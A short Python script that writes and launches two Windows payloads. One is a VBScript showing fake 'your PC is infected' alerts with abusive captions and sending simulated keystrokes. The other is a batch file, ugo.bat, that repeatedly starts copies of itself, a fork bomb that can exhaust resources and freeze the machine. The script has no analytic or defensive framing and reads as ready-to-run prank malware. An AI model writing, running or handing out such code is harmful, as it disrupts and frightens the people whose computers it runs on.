import os
import subprocess

def write_and_run_vbs(content):
    # Get the directory of the current script
    script_directory = os.path.dirname(os.path.abspath(__file__))

    # Create or open the .vbs file in the script's directory
    script_filename = "my_vbs_script.vbs"
    script_path = os.path.join(script_directory, script_filename)

    with open(script_path, 'w') as file:
        file.write(content)

    print(f"Script written to: {script_path}")

    # Run the VBScript using subprocess
    subprocess.run(["cscript", "//Nologo", script_path])

# Example content to write to the .vbs file
vbs_content = '''
MsgBox "YOUR PC IS INFECTED!", vbInformation, "Your Fucked"
WScript.Sleep 3000  ' Sleep for 3 seconds (3000 milliseconds)

MsgBox "DONT CLOSE ME! YOUR DONE NOW.", vbInformation, "FUCK YOU"
WScript.Sleep 3000  ' Sleep for 3 seconds (3000 milliseconds)

WScript.CreateObject("WScript.Shell").SendKeys "AAAAAAAAAA"  ' Simulate continuous pressing of the "A" 
'''


# Batch file content
batch_content = """
@echo off
start ugo.bat
ugo.bat
"""

# Specify the batch file name and path
batch_file_path = "ugo.bat"

# Write batch content to the file
with open(batch_file_path, 'w') as batch_file:
    batch_file.write(batch_content)

# Run the batch file using subprocess
subprocess.run(["cmd", "/c", batch_file_path], shell=True)




write_and_run_vbs(vbs_content)